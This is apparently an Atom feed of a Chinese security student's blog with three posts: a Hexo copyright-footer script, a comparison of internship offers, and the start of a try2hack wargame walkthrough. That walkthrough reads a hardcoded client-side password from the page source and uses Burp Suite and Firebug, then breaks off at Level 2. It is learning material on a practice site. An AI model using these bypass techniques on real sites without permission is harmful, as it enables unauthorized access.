<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>戚名钰的博客</title>
  <subtitle>怀揣创业梦的信安践行者</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://qimingyu.github.io/"/>
  <updated>2016-06-06T04:34:03.000Z</updated>
  <id>http://qimingyu.github.io/</id>
  
  <author>
    <name>戚名钰</name>
    <email>mingyuqi.java@qq.com</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>为博客文章添加版权声明</title>
    <link href="http://qimingyu.github.io/2016/06/05/%E4%B8%BA%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0%E6%B7%BB%E5%8A%A0%E7%89%88%E6%9D%83%E5%A3%B0%E6%98%8E/"/>
    <id>http://qimingyu.github.io/2016/06/05/为博客文章添加版权声明/</id>
    <published>2016-06-05T15:31:40.000Z</published>
    <updated>2016-06-06T04:34:03.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h2&gt;&lt;p&gt;开始写博客不久，自认为只是为了促进自我学习，所以文章写得也并不十分精细。可这几天一反常态，陆陆续续在微博上总有人加我。直到一天在微博上收到了这样的一封私信：&lt;br&gt;&lt;img src=&quot;/images/copyright/1.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;&lt;img src=&quot;/images/copyright/2.png&quot; alt=&quot;2&quot;&gt;&lt;br&gt;开始我并没在意，觉得自己写的文章居然还有人看上了，并且是有着79万粉丝的微博大咖，内心还是感觉不错的。于是很单纯的按照其指示加微信及QQ好友，可是申请虽提交了，对方却毫无回应，既没同意也没反对，于是我也就没放心上，就当这事儿过去了。&lt;/p&gt;
&lt;p&gt;可是之后还是陆陆续续总有人微博粉我，刚好今天下午我很闲，于是就在微博里面搜索了下自己的名字，结果出现了这样的画面：&lt;br&gt;&lt;img src=&quot;/images/copyright/3.png&quot; alt=&quot;3&quot;&gt;&lt;/p&gt;
&lt;p&gt;于是我瞬间就很懵逼了。我不是还没授权的吗？怎么转都转载了？可这并不是重点，重点是当我点开微博里面所给出的链接，原以为会跳到我的博客站点，没想到却跳到了他们的网站，纳尼？？！！&lt;br&gt;&lt;img src=&quot;/images/copyright/4.png&quot; alt=&quot;4&quot;&gt;&lt;/p&gt;
&lt;p&gt;于是这就让我忍无可忍了，虽然你们给出了作者名，但是你们也不能把链接无耻的指向自己的网站吧？也就是说一个正常的用户需要点两次，才能跳到真正的文章原始站点。&lt;/p&gt;
&lt;p&gt;虽然这种盗用转载的事在知乎上屡见不鲜，之前我每次看到作者非常气愤的骂那些公众号时都不太理解，直到今天这事到自己头上，我才明白其中的愤怒。愤怒的原因有以下三点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;自己写的文章被微博营销账号盗用，他们拿你的文章增加了自己的粉丝量。于原作者而言，是出力者，却没有得到丝毫收益。而于转载者而言，他们却用别人的劳动成果获得了自己的收益。这是与“盗窃”无一的。感觉自己的劳动却肥了他人，故而愤怒，也难怪王路会&lt;a href=&quot;https://www.douban.com/note/477775111/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;痛骂《罗辑思维》&lt;/a&gt;。&lt;/li&gt;
&lt;li&gt;转载的这两篇文章其实都是残篇，也就是说我并没有写完的。我只是想在网络空间中找一块地方，安安静静的写自己的，学自己的。所以每篇文章的发表，并没有精益求精，而仅仅只是出于监督自己学习的作用。也就是说，我的这两篇文章并不是面对广大读者，而是面对自己的。这就相当于有人把你原本打算私藏的东西公之于众了，并且在微博上以一种不可控的方式进行传播着。这是相当恐怖的，无异于一种舆论暴力，有点类似于电影&lt;a href=&quot;https://movie.douban.com/subject/6799191/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《搜索》&lt;/a&gt;，能够把事情置于自己的可控范围内是很重要的。&lt;/li&gt;
&lt;li&gt;这两篇文章本来就涉及腾讯及360公司的机密，其笔试题本身就是不允许披露出去的。如果万一造成更大影响，其责任是由我来承担的。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;后来，在我努力下，也算是联系到了相关的编辑，该删的都删了，也算解决了这件事。这本身是件很小的事，但使我却不得不防范于未然，幸而在开始遇到这样的事，这是我第一次认识到版权的重要性，当然，也要学会保护自己的知识产权，使其处于自己的可控之中。于是用了近一个下午的时间，重新调整了一下该博客的框架，使其可以在每篇文章之后自动生成“版权声明”。&lt;/p&gt;
&lt;h2 id=&quot;解决方法&quot;&gt;&lt;a href=&quot;#解决方法&quot; class=&quot;headerlink&quot; title=&quot;解决方法&quot;&gt;&lt;/a&gt;解决方法&lt;/h2&gt;&lt;p&gt;以下内容基本来自于&lt;a href=&quot;http://kuangqi.me/tricks/append-a-copyright-info-after-every-post/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这篇文章&lt;/a&gt;，感谢作者给出的方法。&lt;br&gt;代码如下：&lt;br&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// Add a tail to every post from tail.md&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// Great for adding copyright info&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; fs = &lt;span class=&quot;built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;fs&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;hexo.extend.filter.register(&lt;span class=&quot;string&quot;&gt;&#39;before_post_render&#39;&lt;/span&gt;, &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;data&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(data.copyright == &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; data;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; file_content = fs.readFileSync(&lt;span class=&quot;string&quot;&gt;&#39;tail.md&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(file_content &amp;amp;&amp;amp; data.content.length &amp;gt; &lt;span class=&quot;number&quot;&gt;50&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        data.content += file_content;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; permalink = &lt;span class=&quot;string&quot;&gt;&#39;\n本文永久链接：&#39;&lt;/span&gt; + data.permalink;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        data.content += permalink;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; data;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;用记事本打开，把上面代码写进去，然后保存成copyright.js文件，注意编码格式为UTF-8，否则为乱码，放在文件hexo–&amp;gt;themes–&amp;gt;next–&amp;gt;scripts中。&lt;br&gt;然后用MarkDown语法写一段版权声明相关的文字，同样也为UTF-8编码格式，保存为tail.md,放在文件hexo的根目录中即可，注意如果是其他地方，上面的脚本可能会找不到该文件。&lt;br&gt;如果有的文章不需要加版权声明的话，在post文章中加如下代码即可：&lt;br&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;copyright: &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;此时出现了另外一个问题，就是文末的永久链接地址，出现了如下所示的情况：&lt;br&gt;&lt;img src=&quot;/images/copyright/5.png&quot; alt=&quot;5&quot;&gt;&lt;br&gt;即在永久链接出现空格处，就停止了，于是我又把所有文章的命名凡是有空格的地方改为加下划线代替，这里指的是post文件的命名，但正式文件里面文章的名称没变，这样也就不影响阅读了。&lt;br&gt;还有一个问题是所自动生成的链接，前面给出的网址是http:yoursite.com（如上图所示），当我push上去之后还是这个前缀，于是我修改网站的配置文件_config.yml，加了如下代码：&lt;br&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;#定义访问的域名&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;url: http://qimingyu.github.io                  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;root: /&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;指定了网站的前缀域名，之后就正常了。&lt;/p&gt;
&lt;h2 id=&quot;额外&quot;&gt;&lt;a href=&quot;#额外&quot; class=&quot;headerlink&quot; title=&quot;额外&quot;&gt;&lt;/a&gt;额外&lt;/h2&gt;&lt;p&gt;之前是用dropbox同步网站的，经常出现被墙的情况，于是换了坚果云进行同步。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;【版权声明】&lt;/strong&gt;&lt;br&gt;本文首发于&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰的博客&lt;/a&gt;（ &lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;http://qimingyu.github.io/&lt;/a&gt; ），欢迎转载，但是必须保留本文的署名&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰&lt;/a&gt;（包含链接）。如您有任何商业合作或者授权方面的协商，请给我留言：mingyuqi.java@qq.com&lt;br&gt;本文永久链接：&lt;a href=&quot;http://qimingyu.github.io/2016/06/05/为博客文章添加版权声明/&quot;&gt;http://qimingyu.github.io/2016/06/05/为博客文章添加版权声明/&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h2&gt;&lt;p&gt;开始写博客不久，自认为只是为了促进自我学习，所以文章写得也并不十分精细。可这几天一反常态，陆陆续续在微博上总有人加我。直到一天在微博上收到了这样的一封私信：&lt;br&gt;&lt;img src=&quot;/images/copyright/1.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="网站技术" scheme="http://qimingyu.github.io/categories/%E7%BD%91%E7%AB%99%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="hexo" scheme="http://qimingyu.github.io/tags/hexo/"/>
    
      <category term="版权声明" scheme="http://qimingyu.github.io/tags/%E7%89%88%E6%9D%83%E5%A3%B0%E6%98%8E/"/>
    
  </entry>
  
  <entry>
    <title>关于两份实习offer的选择与比较</title>
    <link href="http://qimingyu.github.io/2016/05/27/%E5%85%B3%E4%BA%8E%E4%B8%A4%E4%BB%BD%E5%AE%9E%E4%B9%A0offer%E7%9A%84%E9%80%89%E6%8B%A9%E4%B8%8E%E6%AF%94%E8%BE%83/"/>
    <id>http://qimingyu.github.io/2016/05/27/关于两份实习offer的选择与比较/</id>
    <published>2016-05-27T07:23:30.000Z</published>
    <updated>2016-05-27T08:05:03.000Z</updated>
    
    <content type="html">&lt;p&gt;找实习的工作终于告一段落了，里面各种心酸历程就不提了。现在重点比较下我拿到的两个offer，以及给出我的选择思考过程，由于这次选择将会很大程度上影响甚至决定我未来的发展方向，因此这次选择是相当关键的。在此，我做出了基于自身的思考和慎重抉择。我希望十年后，我不后悔今天的这次选择，并且我相信自己的判断。因此，我把自己的思考写下来，希望日后的自己能够感谢现在的自己。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;虽然我们不知道未来等待自己的是什么，但是在现有程度上做出最合理最慎重的选择，是应该的。选择后，就决不后悔，也决不遗憾。&lt;br&gt;两份offer，一个是高通公司，给出的职位是手机支付安全研究与开发。一个是百度公司，给出的职位是威胁情报云安全，用大数据做安全。&lt;br&gt;先说发展趋势，高通是一家主要做芯片的公司，在手机芯片领域具有其垄断优势。而我去做的是手机支付与手机防盗功能，采用的是TEE与TrustZone技术。而TEE与TrustZone应该都属于可信计算的研究范畴，集中是在硬件设备，特别是芯片层面的安全之上，带我的师兄是做嵌入式出身的。对于高通公司而言，这一块是可以做，也是可以推的，因为毕竟微软、华为、IBM都给出了自己的系统安全解决方案，往后发展，芯片层面的安全应该会是智能设备的标配。对于我的师兄来说，嵌入式出身去高通应该是非常合理且合适的，并且也是相当优秀的。但是可信计算当前的现状是学术界大大走在了工业界之前，虽然沈昌祥院士前不久作了题为&lt;a href=&quot;http://science.china.com.cn/2015-11/04/content_8349167.htm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《用可信计算构筑网络安全》&lt;/a&gt;的报告。但是在知乎上面很多人却给出了&lt;a href=&quot;https://www.zhihu.com/question/45344859&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;不同的意见&lt;/a&gt;。而一个人要想在合理的时间内站上时代的风口浪尖，一定要往最新最热最火的方向跑，因为这样个人才会获得最快速的成长，获得最大的自由。而不是在一个奄奄一息的地方浪费生命。总体来说，在高通，把安全做进芯片，进而给出一整套的安全解决方案，这是一种纯技术，而这些技术往往又没有体现在用户身上，自然其价值很难准确衡量和体现，更重要的是，以市场的角度去衡量，这并不是一个现金流部门，并不是直接与用户进行对话，他们的价格是依赖于下游的供应商和上游的手机制造商的，安全包含于整个产品之中，单就部门议价能力而言是不够的。也正是这样的原因，导致了高通外企的不加班，并且薪水的中规中矩（正式员工），这几乎是整体科技企业的现状，当然也包括华为在内。而之所以实习工资开的高，估计高通的逼格也比较高导致的吧。但是往往一个公司逼格高，不一定代表你所在的部门就逼格高，而即使你所在的部门逼格高，也并不代表你在里面就能做自己真正想做的事。外企还存在一个问题是人情的冷暖，也就是工作和生活分的很开，职位权责也很分明，各司其职。在其中待久了，会导致与社会主流一定程度上的脱节。如果说，干了3年，想跳槽，那时候你的积累是什么？人脉及圈子吗？你在外企，与国内的主流互联网公司并不是一个圈子，到时候创业很困难，几乎没有可能性了。跳槽的话，也估计是相同的科技型企业，就我个人而言，这应该不是我要的。&lt;br&gt;整体而言，互联网公司与科技公司还是有很大不同的，互联网公司直接面对的是用户，直接为用户提供服务，在这点上，我更喜欢互联网公司。互联网公司的思维方式也与传统科技型企业有很大不同，互联网公司更开放，更活跃，也更创新。&lt;br&gt;安全分为：移动安全（支付，APP），系统安全（Windows客户端，PE，病毒），网络安全（Web渗透），云安全（大数据），工控安全(设备安全）等，在众多的安全领域和分支下，云安全和移动安全是目前非常好两个的趋势，各大互联网公司都在做（BAT+360），其实技术总体呈现出错综复杂，各领域融合的特点，也就是非常需要复合型与快速学习型的人才。移动安全我没有了解过，我稍微有点优势的地方应该在于系统安全、网络安全和云安全。&lt;br&gt;因此对于9月份的校招，我有两个方向，要么去乙方公司做网络安全的Web渗透方向，要么去甲方公司做大数据方向。这是我现在的思考。&lt;br&gt;除了互联网公司天生基因的优越性，我选择百度的还有一个原因是百度做的东西与我的毕业设计挂钩，由于毕业设计是做差分隐私，也是非常上层的处理，因此也是有用的。&lt;br&gt;其实企业招人，关键在于匹配度，之所以存在很优秀的人找不到好工作，可能就是研究方向偏冷门导致的。那么目前，我所欠缺之处在于：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;基础知识部分还需要加强，其包括语言及算法&lt;/li&gt;
&lt;li&gt;需要拓宽各个安全领域的知识面&lt;/li&gt;
&lt;li&gt;深入学习数据挖掘算法（云方向发展）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;去百度之后，好好学习。要有自己的方向及自己的思考，此最为关键。基于自己独立的思考和判断，可以听别人的意见，但决定一定自己做出，一定要不拘一格走出自己的道路，并且有自己的个性。  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;【版权声明】&lt;/strong&gt;&lt;br&gt;本文首发于&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰的博客&lt;/a&gt;（ &lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;http://qimingyu.github.io/&lt;/a&gt; ），欢迎转载，但是必须保留本文的署名&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰&lt;/a&gt;（包含链接）。如您有任何商业合作或者授权方面的协商，请给我留言：mingyuqi.java@qq.com&lt;br&gt;本文永久链接：&lt;a href=&quot;http://qimingyu.github.io/2016/05/27/关于两份实习offer的选择与比较/&quot;&gt;http://qimingyu.github.io/2016/05/27/关于两份实习offer的选择与比较/&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;找实习的工作终于告一段落了，里面各种心酸历程就不提了。现在重点比较下我拿到的两个offer，以及给出我的选择思考过程，由于这次选择将会很大程度上影响甚至决定我未来的发展方向，因此这次选择是相当关键的。在此，我做出了基于自身的思考和慎重抉择。我希望十年后，我不后悔今天的这次选择，并且我相信自己的判断。因此，我把自己的思考写下来，希望日后的自己能够感谢现在的自己。&lt;br&gt;
    
    </summary>
    
      <category term="笔试面经" scheme="http://qimingyu.github.io/categories/%E7%AC%94%E8%AF%95%E9%9D%A2%E7%BB%8F/"/>
    
    
      <category term="高通" scheme="http://qimingyu.github.io/tags/%E9%AB%98%E9%80%9A/"/>
    
      <category term="百度" scheme="http://qimingyu.github.io/tags/%E7%99%BE%E5%BA%A6/"/>
    
      <category term="可信计算" scheme="http://qimingyu.github.io/tags/%E5%8F%AF%E4%BF%A1%E8%AE%A1%E7%AE%97/"/>
    
      <category term="威胁情报" scheme="http://qimingyu.github.io/tags/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>try2hack通关教程</title>
    <link href="http://qimingyu.github.io/2016/05/12/try2hack%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/"/>
    <id>http://qimingyu.github.io/2016/05/12/try2hack通关教程/</id>
    <published>2016-05-12T03:25:36.000Z</published>
    <updated>2016-05-17T07:42:35.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;初衷&quot;&gt;&lt;a href=&quot;#初衷&quot; class=&quot;headerlink&quot; title=&quot;初衷&quot;&gt;&lt;/a&gt;初衷&lt;/h2&gt;&lt;p&gt;既然学完了WebGoat系列教程，下面来综合实战演练一下，同时也是检测一下自己的学习成果如何。&lt;br&gt;找了这样的一个网站，&lt;a href=&quot;http://www.try2hack.nl/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;try2hack&lt;/a&gt;，这是一个专门用来做网络攻击练习的网站，虽然比较老了，但用来做练习还是可以的。该网站一共有13道关卡，难度是逐步递增的，下面我们逐一开始挑战。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;实战攻击&quot;&gt;&lt;a href=&quot;#实战攻击&quot; class=&quot;headerlink&quot; title=&quot;实战攻击&quot;&gt;&lt;/a&gt;实战攻击&lt;/h2&gt;&lt;p&gt;这是该网站开始的页面：&lt;br&gt;&lt;img src=&quot;/images/try2hack/2.png&quot; alt=&quot;2&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;Level-1&quot;&gt;&lt;a href=&quot;#Level-1&quot; class=&quot;headerlink&quot; title=&quot;Level 1&quot;&gt;&lt;/a&gt;Level 1&lt;/h3&gt;&lt;p&gt;这是第一关，网址：&lt;a href=&quot;http://www.try2hack.nl/levels/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.try2hack.nl/levels/&lt;/a&gt;&lt;br&gt;&lt;img src=&quot;/images/try2hack/3.png&quot; alt=&quot;3&quot;&gt;&lt;br&gt;上图要求我们输入密码然后通过。我试着随便输入了两次密码，均弹出如下提示：&lt;br&gt;&lt;img src=&quot;/images/try2hack/4.png&quot; alt=&quot;4&quot;&gt;&lt;/p&gt;
&lt;p&gt;点击确定之后就跳转到了&lt;a href=&quot;http://www.disney.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;迪斯尼&lt;/a&gt;的网站。此时burpsuit才拦截到浏览器发给服务器的包。也就是说验证过程是在拦截到包之前发生的。&lt;br&gt;由此推断这是一个客户端的验证程序，并且是用JS验证密码的。我们知道所有在客户端进行的验证程序都是不安全的。果然，当查看该页面的源代码，看到了如下JS的代码片段：&lt;/p&gt;
&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;script type=&lt;span class=&quot;string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;xml&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&amp;lt;!--&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  function Try(passwd) &amp;#123;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if (passwd ==&quot;h4x0r&quot;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      alert(&quot;Alright! On to level 2...&quot;);   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      location.href = &quot;level2-xfdgnh.xhtml&quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      alert(&quot;The password is incorrect. Please don&#39;t try again.&quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      location.href = &quot;http://www.disney.com/&quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  //--&amp;gt;&lt;/span&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;由IF判断语句可以看出密码为h4x0r，于是输入密码：h4x0r，然后提交：&lt;br&gt;&lt;img src=&quot;/images/try2hack/1.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;第一关就轻松通过了。&lt;br&gt;&lt;strong&gt;总结：这一关主要考查Html的页面源代码和JS。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;Level-2&quot;&gt;&lt;a href=&quot;#Level-2&quot; class=&quot;headerlink&quot; title=&quot;Level 2&quot;&gt;&lt;/a&gt;Level 2&lt;/h3&gt;&lt;p&gt;网址：&lt;a href=&quot;http://www.try2hack.nl/levels/level2-xfdgnh.xhtml&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.try2hack.nl/levels/level2-xfdgnh.xhtml&lt;/a&gt;&lt;br&gt;第二关的页面如下：&lt;br&gt;&lt;img src=&quot;/images/try2hack/5.png&quot; alt=&quot;5&quot;&gt;&lt;br&gt;可以看出是需要我们输入用户名和密码，然后提交。但有一个问题就是当我们输入用户名和密码之后，点击下面第三个提交的按钮却没有反应。&lt;br&gt;于是我们打开burpsuit抓包试试，点击下面第三个按钮，burpsuit抓不到任何数据，也就是说这个按钮没有提交任何数据给服务器。那么我们需要看看该按钮所对应的function是什么了。结果在该页面单击鼠标右键希望查看该页面源代码的时候，页面却弹出了这样一个提示：&lt;br&gt;&lt;img src=&quot;/images/try2hack/6.png&quot; alt=&quot;6&quot;&gt;&lt;br&gt;也就是说在该页面鼠标右键是禁止点击的。观察到页面弹出提示的同时，输入用户名和密码的部分也消失了，同时burpsuit捕获到了数据包。不要紧，我们还有firebug，按F12打开firebug，可以看到如下代码，并且发现整个页面都处于JS的function中，原来如此！&lt;br&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span 